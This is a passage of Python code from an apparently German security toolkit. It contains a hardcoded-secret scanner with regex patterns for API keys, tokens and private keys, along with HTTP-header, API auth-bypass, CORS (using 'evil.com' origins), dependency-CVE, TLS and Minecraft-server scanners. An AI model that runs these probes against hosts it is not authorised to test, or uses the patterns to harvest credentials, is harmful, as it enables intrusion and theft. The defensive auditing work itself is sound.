    print(f"  {DIM}Scannt Dateien/Ordner nach hardcodierten API-Keys, Tokens, Passwörtern.{R}\n")
    path = inp("Pfad zum Scannen (Datei oder Ordner)")
    if not path: wait(); return
    if not os.path.exists(path):
        print(f"  {RED}Pfad nicht gefunden: {path}{R}"); wait(); return

    PATTERNS = [
        ("AWS Access Key",       r'AKIA[0-9A-Z]{16}'),
        ("AWS Secret Key",       r'(?i)aws.{0,20}secret.{0,20}[\'"][0-9a-zA-Z/+]{40}[\'"]'),
        ("GitHub Token",         r'ghp_[0-9a-zA-Z]{36}'),
        ("GitHub OAuth",         r'gho_[0-9a-zA-Z]{36}'),
        ("Slack Token",          r'xox[baprs]-[0-9a-zA-Z\-]{10,}'),
        ("Discord Token",        r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}'),
        ("Stripe Key",           r'sk_live_[0-9a-zA-Z]{24,}'),
        ("Stripe Publishable",   r'pk_live_[0-9a-zA-Z]{24,}'),
        ("Google API Key",       r'AIza[0-9A-Za-z\-_]{35}'),
        ("Telegram Bot Token",   r'[0-9]{8,10}:[a-zA-Z0-9_-]{35}'),
        ("Generic API Key",      r'(?i)api[_-]?key[\'"\s:=]+[\'"]?([a-zA-Z0-9_\-]{20,})[\'"]?'),
        ("Generic Secret",       r'(?i)secret[_-]?key[\'"\s:=]+[\'"]?([a-zA-Z0-9_\-]{20,})[\'"]?'),
        ("Generic Password",     r'(?i)password[\'"\s:=]+[\'"]([^\'"\n]{8,})[\'"]'),
        ("Bearer Token",         r'(?i)bearer\s+[a-zA-Z0-9\-_.~+/]{20,}'),
        ("Private Key Header",   r'-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----'),
        ("DB Connection String", r'(?i)(mysql|postgres|mongodb|redis)://[^\s\'"]+:[^\s\'"@]+@'),
    ]

    findings = []
    scanned  = 0
    skip_ext = {".png",".jpg",".jpeg",".gif",".svg",".ico",".mp4",".zip",".gz",
                ".tar",".exe",".dll",".so",".pyc",".class",".pdf",".docx"}

    def _scan_file(fp):
        nonlocal scanned
        try:
            if os.path.getsize(fp) > 2 * 1024 * 1024: return  # skip >2MB
            _, ext = os.path.splitext(fp)
            if ext.lower() in skip_ext: return
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                for i, line in enumerate(f, 1):
                    for name, pat in PATTERNS:
                        if re.search(pat, line):
                            findings.append((fp, i, name, line.strip()[:80]))
            scanned += 1
        except Exception:
            pass

    if os.path.isfile(path):
        _scan_file(path)
    else:
        for root, dirs, files in os.walk(path):
            dirs[:] = [d for d in dirs if d not in {".git","node_modules","__pycache__",".venv","venv"}]
            for fn in files:
                _scan_file(os.path.join(root, fn))

    W = 74
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}SECRET SCANNER — {scanned} Dateien gescannt{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    if not findings:
        print(f"  {DG}║{R}  {G}✓ Keine Secrets gefunden{R}")
    else:
        print(f"  {DG}║{R}  {RED}⚠  {len(findings)} mögliche(s) Secret(s) gefunden!{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")
        grouped = {}
        for fp, ln, name, snippet in findings:
            grouped.setdefault(fp, []).append((ln, name, snippet))
        for fp, hits in grouped.items():
            short = fp if len(fp) <= 55 else "..." + fp[-52:]
            print(f"  {DG}║{R}  {YG}{short}{R}")
            for ln, name, snippet in hits:
                print(f"  {DG}║{R}    {RED}[{name}]{R} {DIM}Zeile {ln}: {snippet[:55]}{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {DIM}Tipp: Secrets nie im Code committen — .env + .gitignore nutzen{R}")

    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 110  HTTP HEADERS ANALYZER ────────────────────────────────────────────────
def http_headers_analyzer():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("HTTP HEADERS ANALYZER")
    print(f"  {DIM}Prüft Security-Header und gibt Empfehlungen.{R}\n")
    url = inp("URL (z.B. https://example.com)")
    if not url: wait(); return
    if not url.startswith("http"): url = "https://" + url

    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            hdrs = dict(r.headers)
            status = r.status
    except urllib.error.HTTPError as e:
        hdrs = dict(e.headers); status = e.code
    except Exception as e:
        print(f"  {RED}Fehler: {e}{R}"); wait(); return

    hdrs_lower = {k.lower(): v for k, v in hdrs.items()}
    W = 74
    score = 100
    findings = []

    CHECKS = [
        ("strict-transport-security", "HSTS",
         "Erzwingt HTTPS — schützt vor Downgrade-Angriffen",
         "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"),
        ("content-security-policy", "CSP",
         "Verhindert XSS durch erlaubte Quellen-Whitelist",
         "Add: Content-Security-Policy: default-src 'self'"),
        ("x-frame-options", "X-Frame-Options",
         "Verhindert Clickjacking via iFrame",
         "Add: X-Frame-Options: DENY"),
        ("x-content-type-options", "X-Content-Type-Options",
         "Verhindert MIME-Sniffing",
         "Add: X-Content-Type-Options: nosniff"),
        ("referrer-policy", "Referrer-Policy",
         "Kontrolliert Referrer-Informationen",
         "Add: Referrer-Policy: strict-origin-when-cross-origin"),
        ("permissions-policy", "Permissions-Policy",
         "Kontrolliert Browser-Features (Kamera, Mikro, GPS)",
         "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"),
        ("x-xss-protection", "X-XSS-Protection",
         "Legacy XSS-Schutz (ältere Browser)",
         "Add: X-XSS-Protection: 1; mode=block"),
    ]

    LEAK_HEADERS = [
        ("server", "Server-Banner", "Verrät Serversoftware + Version"),
        ("x-powered-by", "X-Powered-By", "Verrät Backend-Technologie"),
        ("x-aspnet-version", "ASP.NET Version", "Verrät .NET-Version"),
        ("x-aspnetmvc-version", "ASP.NET MVC Version", "Verrät MVC-Version"),
    ]

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}HTTP HEADERS — {url[:45]}  [{status}]{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── SECURITY HEADERS ──{R}")

    for key, label, desc, fix in CHECKS:
        if key in hdrs_lower:
            val = hdrs_lower[key][:45]
            print(f"  {DG}║{R}  {G}✓{R}  {DIM}{label:<28}{R}  {G}{val}{R}")
        else:
            score -= 12
            findings.append((label, fix))
            print(f"  {DG}║{R}  {RED}✗{R}  {DIM}{label:<28}{R}  {RED}FEHLT{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── INFO-LEAK HEADERS ──{R}")
    for key, label, desc in LEAK_HEADERS:
        if key in hdrs_lower:
            score -= 5
            print(f"  {DG}║{R}  {YG}⚠{R}  {DIM}{label:<28}{R}  {YG}{hdrs_lower[key][:40]}{R}")
        else:
            print(f"  {DG}║{R}  {G}✓{R}  {DIM}{label:<28}{R}  {G}nicht gesetzt (gut){R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    score = max(0, score)
    scol = G if score >= 80 else YG if score >= 50 else RED
    print(f"  {DG}║{R}  {C}SICHERHEITS-SCORE:{R}  {scol}{score}/100{R}")
    if findings:
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}── EMPFEHLUNGEN ──{R}")
        for label, fix in findings:
            print(f"  {DG}║{R}  {YG}→{R}  {DIM}{fix[:65]}{R}")

    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 111  API SECURITY TESTER ──────────────────────────────────────────────────
def api_security_tester():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("API SECURITY TESTER")
    print(f"  {DIM}Testet REST-APIs auf Auth-Bypass, Rate Limiting, IDOR u.v.m.{R}\n")
    base = inp("API Base-URL (z.B. https://api.example.com)")
    if not base: wait(); return
    if not base.startswith("http"): base = "https://" + base
    base = base.rstrip("/")

    token = inp("Bearer Token (optional, Enter überspringen)")
    hdrs_auth = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    if token: hdrs_auth["Authorization"] = f"Bearer {token}"

    def _req(url, method="GET", data=None, hdrs=None, timeout=7):
        h = dict(hdrs_auth)
        if hdrs: h.update(hdrs)
        try:
            bd = json.dumps(data).encode() if data else None
            req = urllib.request.Request(url, data=bd, method=method, headers=h)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(8192).decode(errors="ignore")
                return r.status, dict(r.headers), body
        except urllib.error.HTTPError as e:
            try: b = e.read(4096).decode(errors="ignore")
            except: b = ""
            return e.code, dict(e.headers), b
        except Exception as ex:
            return 0, {}, str(ex)

    W = 74
    findings = []
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}API SECURITY TESTER — {base[:40]}{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    def hit(sev, test, detail):
        findings.append((sev, test, detail))
        col = RED if sev == "KRIT" else YG if sev == "WARN" else G
        print(f"  {DG}║{R}  {col}[{sev}]{R}  {DIM}{test:<25}{R}  {col}{detail[:30]}{R}")

    def ok(test, detail=""):
        print(f"  {DG}║{R}  {G}[ OK ]{R}  {DIM}{test:<25}{R}  {DIM}{detail[:30]}{R}")

    # 1. Base erreichbar?
    print(f"  {DG}║{R}  {C}── ERREICHBARKEIT ──{R}")
    sc, rhdrs, body = _req(base)
    if sc == 0:
        hit("KRIT", "Erreichbar", "API nicht erreichbar")
        print(f"  {DG}╚{'═'*W}╝{R}"); wait(); return
    ok("Erreichbar", f"HTTP {sc}")

    # 2. Auth ohne Token
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── AUTH BYPASS ──{R}")
    no_auth_hdrs = {"User-Agent": "Mozilla/5.0"}
    sc2, _, body2 = _req(base, hdrs=no_auth_hdrs)
    if sc2 in (200, 201):
        hit("KRIT", "Auth ohne Token", f"HTTP {sc2} — kein Auth nötig!")
    elif sc2 in (401, 403):
        ok("Auth ohne Token", f"HTTP {sc2} — wird verweigert")
    else:
        hit("WARN", "Auth ohne Token", f"HTTP {sc2} — unerwartet")

    # Leeres Bearer
    sc3, _, _ = _req(base, hdrs={"Authorization": "Bearer ", "User-Agent": "Mozilla/5.0"})
    if sc3 == 200:
        hit("KRIT", "Leeres Bearer Token", "HTTP 200 — akzeptiert!")
    else:
        ok("Leeres Bearer Token", f"HTTP {sc3}")

    # 3. HTTP Methoden
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── HTTP METHODEN ──{R}")
    for method in ["OPTIONS", "PUT", "DELETE", "PATCH", "TRACE"]:
        sc_m, rh_m, _ = _req(base, method=method)
        allow = rh_m.get("Allow","").upper() if hasattr(rh_m, "get") else ""
        if sc_m in (200, 201, 204) or method in allow:
            hit("WARN", f"Methode {method}", f"HTTP {sc_m} — erlaubt")
        else:
            ok(f"Methode {method}", f"HTTP {sc_m}")

    # 4. Rate Limiting
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── RATE LIMITING ──{R}")
    codes = []
    for _ in range(10):
        sc_r, rh_r, _ = _req(base)
        codes.append(sc_r)
    rl_hdrs = {k.lower() for k in (rh_r if isinstance(rh_r, dict) else {})}
    has_rl = any(h in rl_hdrs for h in ("x-ratelimit-limit","ratelimit-limit","retry-after","x-rate-limit-limit"))
    if 429 in codes:
        ok("Rate Limiting", "429 nach vielen Requests")
    elif has_rl:
        ok("Rate Limiting", "Rate-Limit Header vorhanden")
    else:
        hit("WARN", "Rate Limiting", "Kein Limit erkannt")

    # 5. Security Headers
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── SECURITY HEADERS ──{R}")
    rh_l = {k.lower(): v for k, v in (rhdrs.items() if isinstance(rhdrs, dict) else {}.items())}
    for h in ["x-content-type-options", "strict-transport-security", "content-security-policy"]:
        if h in rh_l: ok(h, rh_l[h][:25])
        else: hit("WARN", h, "fehlt")

    # Zusammenfassung
    print(f"  {DG}╠{'═'*W}╣{R}")
    crits = sum(1 for s,_,__ in findings if s=="KRIT")
    warns = sum(1 for s,_,__ in findings if s=="WARN")
    col = RED if crits > 0 else YG if warns > 0 else G
    print(f"  {DG}║{R}  {col}Ergebnis: {crits} kritisch · {warns} Warnungen{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 112  CORS TESTER ──────────────────────────────────────────────────────────
def cors_tester():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("CORS TESTER")
    print(f"  {DIM}Testet CORS-Misconfiguration — Wildcard, Origin-Reflection, Credentials.{R}\n")
    url = inp("URL (z.B. https://api.example.com)")
    if not url: wait(); return
    if not url.startswith("http"): url = "https://" + url

    W = 74
    findings = []

    def _cors_req(origin):
        try:
            req = urllib.request.Request(url, method="GET", headers={
                "Origin": origin, "User-Agent": "Mozilla/5.0"
            })
            with urllib.request.urlopen(req, timeout=7) as r:
                return dict(r.headers)
        except urllib.error.HTTPError as e:
            return dict(e.headers)
        except Exception:
            return {}

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}CORS TESTER — {url[:45]}{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    tests = [
        ("https://evil.com",          "Evil Origin"),
        ("null",                       "Null Origin"),
        ("https://evil.example.com",  "Subdomain Evil (falls *.example.com)"),
        (url.split("/")[0] + "//" + url.split("/")[2] + ".evil.com", "Suffix Bypass"),
    ]

    for origin, label in tests:
        rh = _cors_req(origin)
        acao = rh.get("Access-Control-Allow-Origin", "")
        acac = rh.get("Access-Control-Allow-Credentials", "")
        if acao == "*":
            findings.append(("WARN", label, "Wildcard (*) — Credentials nicht möglich aber offen"))
            print(f"  {DG}║{R}  {YG}⚠  {label:<35}{R}  {YG}ACAO: *{R}")
        elif acao == origin or acao == "null":
            if acac.lower() == "true":
                findings.append(("KRIT", label, f"Origin reflektiert + Credentials=true!"))
                print(f"  {DG}║{R}  {RED}✗  {label:<35}{R}  {RED}REFLEKTIERT + CREDENTIALS!{R}")
            else:
                findings.append(("WARN", label, "Origin wird reflektiert"))
                print(f"  {DG}║{R}  {YG}⚠  {label:<35}{R}  {YG}Origin reflektiert{R}")
        else:
            print(f"  {DG}║{R}  {G}✓  {label:<35}{R}  {DIM}Geblockt ({acao or 'kein Header'}){R}")

    # Preflight
    print(f"  {DG}╠{'═'*W}╣{R}")
    try:
        req = urllib.request.Request(url, method="OPTIONS", headers={
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Authorization",
            "User-Agent": "Mozilla/5.0"
        })
        with urllib.request.urlopen(req, timeout=6) as r:
            ph = dict(r.headers)
    except urllib.error.HTTPError as e:
        ph = dict(e.headers)
    except Exception:
        ph = {}

    acam = ph.get("Access-Control-Allow-Methods","")
    acah = ph.get("Access-Control-Allow-Headers","")
    print(f"  {DG}║{R}  {C}Preflight (OPTIONS):{R}")
    if acam: print(f"  {DG}║{R}  {DIM}Allow-Methods:{R}  {YG}{acam[:55]}{R}")
    if acah: print(f"  {DG}║{R}  {DIM}Allow-Headers:{R}  {YG}{acah[:55]}{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    crits = sum(1 for s,_,__ in findings if s=="KRIT")
    warns = sum(1 for s,_,__ in findings if s=="WARN")
    col = RED if crits > 0 else YG if warns > 0 else G
    print(f"  {DG}║{R}  {col}Ergebnis: {crits} kritisch · {warns} Warnungen · {len(tests)-crits-warns} sicher{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 113  DEPENDENCY CHECKER ───────────────────────────────────────────────────
def dependency_checker():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("DEPENDENCY CHECKER")
    print(f"  {DIM}Prüft requirements.txt / package.json auf bekannte CVEs via OSV.dev.{R}\n")
    path = inp("Pfad zur requirements.txt oder package.json")
    if not path: wait(); return
    if not os.path.exists(path):
        print(f"  {RED}Datei nicht gefunden: {path}{R}"); wait(); return

    fname = os.path.basename(path).lower()
    packages = []

    if "requirements" in fname or path.endswith(".txt"):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                m = re.match(r'^([A-Za-z0-9_\-\.]+)\s*[>=<!~^]+\s*([0-9][^\s,;]*)', line)
                if m: packages.append(("pypi", m.group(1), m.group(2)))
                else:
                    m2 = re.match(r'^([A-Za-z0-9_\-\.]+)', line)
                    if m2: packages.append(("pypi", m2.group(1), ""))
    elif "package" in fname and fname.endswith(".json"):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            for sec in ("dependencies", "devDependencies"):
                for pkg, ver in data.get(sec, {}).items():
                    clean = re.sub(r'[^0-9.]', '', ver)
                    packages.append(("npm", pkg, clean))
        except Exception as e:
            print(f"  {RED}JSON Fehler: {e}{R}"); wait(); return

    W = 74
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}DEPENDENCY CHECKER — {len(packages)} Pakete{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    if not packages:
        print(f"  {DG}║{R}  {YG}Keine Pakete gefunden{R}")
        print(f"  {DG}╚{'═'*W}╝{R}"); wait(); return

    vulns_found = []
    print(f"  {DG}║{R}  {DIM}Prüfe via osv.dev API ...{R}")

    for ecosystem, pkg, version in packages[:40]:
        try:
            eco_map = {"pypi": "PyPI", "npm": "npm"}
            eco = eco_map.get(ecosystem, "PyPI")
            payload = json.dumps({
                "package": {"name": pkg, "ecosystem": eco},
                "version": version
            }).encode()
            req = urllib.request.Request(
                "https://api.osv.dev/v1/query",
                data=payload,
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "OpenVS/1.0"}
            )
            with urllib.request.urlopen(req, timeout=8) as r:
                data = json.loads(r.read())
            vulns = data.get("vulns", [])
            if vulns:
                for v in vulns[:2]:
                    cve_id = v.get("id","?")
                    summary = v.get("summary","")[:45]
                    sev = "KRIT" if "critical" in summary.lower() else "WARN"
                    vulns_found.append((pkg, version, cve_id, summary))
                    col = RED if sev == "KRIT" else YG
                    print(f"  {DG}║{R}  {col}[{cve_id}]{R}  {YG}{pkg:<20}{R}  {DIM}{summary}{R}")
        except Exception:
            pass

    if not vulns_found:
        print(f"  {DG}║{R}  {G}✓ Keine bekannten Schwachstellen gefunden{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {DIM}Quelle: osv.dev (Google Open Source Vulnerabilities){R}")
    print(f"  {DG}║{R}  {DIM}Tipp: Abhängigkeiten regelmäßig updaten!{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 114  SSL/TLS DEEP SCANNER ─────────────────────────────────────────────────
def ssl_deep_scanner():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("SSL/TLS DEEP SCANNER")
    print(f"  {DIM}Prüft TLS-Version, Cipher Suites, Zertifikat-Kette und HSTS.{R}\n")
    host = inp("Hostname (z.B. example.com)")
    if not host: wait(); return
    host = re.sub(r'^https?://', '', host).split('/')[0].strip()
    port_s = inp("Port [443]") or "443"
    try: port = int(port_s)
    except: port = 443

    W = 74
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}SSL/TLS DEEP SCAN — {host}:{port}{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    # TLS Versionen testen
    TLS_VERSIONS = []
    try:
        import ssl as _ssl
        _TLS_MAP = [
            ("TLS 1.3", getattr(_ssl, "PROTOCOL_TLS_CLIENT", _ssl.PROTOCOL_TLS)),
            ("TLS 1.2", getattr(_ssl, "PROTOCOL_TLSv1_2",   None)),
            ("TLS 1.1", getattr(_ssl, "PROTOCOL_TLSv1_1",   None)),
            ("TLS 1.0", getattr(_ssl, "PROTOCOL_TLSv1",     None)),
        ]
        print(f"  {DG}║{R}  {C}── TLS VERSIONEN ──{R}")
        for name, proto in _TLS_MAP:
            if proto is None: continue
            try:
                ctx = _ssl.SSLContext(proto)
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                with socket.create_connection((host, port), timeout=4) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as s:
                        actual = s.version()
                        cipher = s.cipher()
                        TLS_VERSIONS.append((name, actual, cipher))
                        bad = actual in ("TLSv1", "TLSv1.1", "SSLv3")
                        col = RED if bad else G
                        print(f"  {DG}║{R}  {col}✓  {name:<10}{R}  {DIM}{actual or '?':<10}  {cipher[0] if cipher else '?'}{R}")
            except Exception:
                print(f"  {DG}║{R}  {DIM}✗  {name:<10}  nicht unterstützt{R}")
    except Exception as e:
        print(f"  {DG}║{R}  {YG}TLS-Test: {e}{R}")

    # Zertifikat Details
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── ZERTIFIKAT ──{R}")
    try:
        import ssl as _ssl
        from datetime import datetime as _dt
        ctx = _ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as s:
                cert = s.getpeercert()
                cipher = s.cipher()
        subj   = dict(x[0] for x in cert.get("subject", []))
        issuer = dict(x[0] for x in cert.get("issuer", []))
        exp    = cert.get("notAfter","?")
        nb     = cert.get("notBefore","?")
        sans   = [v for t, v in cert.get("subjectAltName",[])]

        try:
            exp_dt = _dt.strptime(exp, "%b %d %H:%M:%S %Y %Z")
            days_left = (exp_dt - _dt.utcnow()).days
            exp_str = f"{exp} ({days_left}d)"
            exp_warn = days_left < 30
        except Exception:
            exp_str = exp; exp_warn = False

        def crow(k, v, warn=False):
            col = RED if warn else DIM
            print(f"  {DG}║{R}  {col}{k:<22}{R}  {G if not warn else RED}{v[:45]}{R}")

        crow("Common Name",   subj.get("commonName","?"))
        crow("Ausgestellt von", issuer.get("organizationName","?"))
        crow("Gültig ab",     nb)
        crow("Läuft ab",      exp_str, warn=exp_warn)
        crow("Cipher Suite",  cipher[0] if cipher else "?")
        if sans:
            print(f"  {DG}║{R}  {DIM}SANs ({len(sans)}):{R}  {G}{', '.join(sans[:4])}{R}")
    except _ssl.SSLCertVerificationError:
        print(f"  {DG}║{R}  {RED}✗ Zertifikat ungültig / selbstsigniert{R}")
    except Exception as e:
        print(f"  {DG}║{R}  {YG}Zertifikat: {e}{R}")

    # HSTS
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── HSTS CHECK ──{R}")
    try:
        import ssl as _ssl2
        ctx = _ssl2.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl2.CERT_NONE
        req = urllib.request.Request(f"https://{host}", headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=6, context=ctx) as r:
            hsts = r.headers.get("Strict-Transport-Security","")
        if hsts:
            print(f"  {DG}║{R}  {G}✓ HSTS aktiv:{R}  {DIM}{hsts[:55]}{R}")
            if "includeSubDomains" in hsts:
                print(f"  {DG}║{R}  {G}✓ includeSubDomains gesetzt{R}")
            if "preload" in hsts:
                print(f"  {DG}║{R}  {G}✓ preload gesetzt{R}")
        else:
            print(f"  {DG}║{R}  {RED}✗ HSTS fehlt{R}")
    except Exception as e:
        print(f"  {DG}║{R}  {YG}HSTS: {e}{R}")

    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 115  MINECRAFT SERVER SECURITY SCANNER ────────────────────────────────────
def mc_security_scanner():
    RED  = "\033[91m"
    BRED = "\033[1;91m"
    hdr("MINECRAFT SERVER SECURITY SCANNER")
    print(f"  {DIM}Scannt MC-Server auf Plugin-Schwachstellen, Exploits & Fehlkonfigurationen.{R}\n")
    host = inp("Server IP / Hostname")
    if not host: wait(); return
    port_s = inp("Port [25565]") or "25565"
    try: port = int(port_s)
    except: port = 25565

    W = 74
    findings = []

    def _varint(val):
        out = b""
        while True:
            b = val & 0x7F
            val >>= 7
            if val: out += bytes([b | 0x80])
            else: out += bytes([b]); break
        return out

    def _mk_packet(pid, data=b""):
        body = _varint(pid) + data
        return _varint(len(body)) + body

    def _get_server_info():
        for proto_ver in [765, 47]:  # 765=1.20, 47=1.8 — beide versuchen
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6)
                s.connect((host, port))
                # Handshake packet
                hs  = _varint(0x00)
                hs += _varint(proto_ver)
                host_enc = host.encode("utf-8")
                hs += _varint(len(host_enc)) + host_enc
                hs += port.to_bytes(2, "big")
                hs += _varint(1)   # next state = status
                s.sendall(_mk_packet(0x00, hs))
                # Status request
                s.sendall(_mk_packet(0x00))
                # Lesen bis { ... } komplett empfangen
                data = b""
                import time as _t
                deadline = _t.time() + 6
                while _t.time() < deadline:
                    try:
                        s.settimeout(2)
                        chunk = s.recv(8192)
                        if not chunk:
                            break
                        data += chunk
                        # Prüfen ob JSON komplett
                        start = data.find(b'{')
                        if start != -1:
                            # Zähle { und } um Ende zu finden
                            depth = 0
                            for i, b in enumerate(data[start:], start):
                                if b == ord('{'): depth += 1
                                elif b == ord('}'): depth -= 1
                                if depth == 0:
                                    try:
                                        result = json.loads(data[start:i+1].decode(errors="ignore"))
                                        s.close()
                                        return result
                                    except Exception:
                                        break
                    except socket.timeout:
                        break
                    except Exception:
                        break
                s.close()
            except Exception:
                pass
        return None

    print(f"  {DIM}Verbinde mit {host}:{port} ...{R}")

    # Port-Check zuerst
    _port_open = False
    try:
        _ts = socket.socket()
        _ts.settimeout(4)
        _port_open = _ts.connect_ex((host, port)) == 0
        _ts.close()
    except Exception:
        pass

    info = _get_server_info() if _port_open else None

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}MC SECURITY SCAN — {host}:{port}{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    if not _port_open:
        print(f"  {DG}║{R}  {RED}Port {port} nicht erreichbar — Server offline?{R}")
        print(f"  {DG}╚{'═'*W}╝{R}"); wait(); return

    if not info:
        print(f"  {DG}║{R}  {YG}Port {port} ist offen — aber kein Status-Ping möglich.{R}")
        print(f"  {DG}║{R}  {DIM}Mögliche Gründe:{R}")
        print(f"  {DG}║{R}  {DIM}  → BungeeCord / Velocity blockiert externe Pings{R}")
        print(f"  {DG}║{R}  {DIM}  → TCPShield / Infrared Anti-Bot-Schutz aktiv{R}")
        print(f"  {DG}║{R}  {DIM}  → Server läuft aber akzeptiert nur echte MC-Clients{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {C}Netzwerk-Checks werden trotzdem durchgeführt ...{R}")
        # Trotzdem RCON + UDP + Online-Mode testen
        ver_name = "Unbekannt (Ping blockiert)"; protocol = 0
        online = 0; maxp = 0; motd = ""; players = []; motd_ver_str = ""
    else:
        # Server Info aus Ping
        ver_name = info.get("version",{}).get("name","?")
        protocol = info.get("version",{}).get("protocol",0)
        online   = info.get("players",{}).get("online",0)
        maxp     = info.get("players",{}).get("max",0)
        motd_raw = info.get("description","")
        if isinstance(motd_raw, dict): motd = motd_raw.get("text","")
        else: motd = str(motd_raw)
        motd = re.sub(r'§.', '', motd).strip()
        players = info.get("players",{}).get("sample",[])
        motd_ver_str = (motd + " " + ver_name).lower()

    def row(k, v, warn=False):
        col = RED if warn else DIM
        print(f"  {DG}║{R}  {col}{k:<24}{R}  {YG if warn else G}{str(v)[:45]}{R}")

    if info:
        print(f"  {DG}║{R}  {C}── SERVER INFO ──{R}")
        row("Version", ver_name)
        row("Protocol", protocol)
        row("Spieler", f"{online}/{maxp}")
        row("MOTD", motd[:45] if motd else "—")

    # Sample-Player-Liste (kann Usernames leaken)
    if players:
        findings.append(("WARN","Player-Liste öffentlich",f"{len(players)} Namen sichtbar"))
        print(f"  {DG}║{R}  {YG}⚠ Spielernamen sichtbar:{R}")
        for p in players[:5]:
            print(f"  {DG}║{R}    {DIM}→ {p.get('name','?')}  {p.get('id','')[:8]}{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── VERSION CHECKS ──{R}")

    # Version-basierte Schwachstellen
    VERSION_VULNS = [
        (r'1\.8',  "CVE-2015-8076", "Buch-Exploit (BookEdit Crash)", "KRIT"),
        (r'1\.9',  "Log4Shell risk","Log4j betrifft alte 1.9.x Paper", "WARN"),
        (r'1\.1[0-5]', "Outdated", "Veraltete Version — viele bekannte Exploits", "WARN"),
        (r'1\.16\.([0-4])', "MC-198713","Chunk-Loading Crash möglich", "KRIT"),
        (r'1\.18\.[01]', "CVE-2021-44228","Log4Shell — KRITISCH! Sofort patchen", "KRIT"),
        (r'1\.19\.([0-2])', "Chat-Report","Chat-Signing erzwungen — Datenschutz", "WARN"),
    ]
    vuln_found_ver = False
    for pat, cve, desc, sev in VERSION_VULNS:
        if re.search(pat, ver_name):
            col = RED if sev == "KRIT" else YG
            print(f"  {DG}║{R}  {col}[{sev}] {cve}{R}  {DIM}{desc}{R}")
            findings.append((sev, cve, desc))
            vuln_found_ver = True
    if not vuln_found_ver:
        print(f"  {DG}║{R}  {G}Keine bekannten Versions-Exploits{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── PLUGIN-SCHWACHSTELLEN (MOTD-Fingerprinting) ──{R}")

    # Plugin-Fingerprinting via MOTD / Version-String
    PLUGIN_SIGS = [
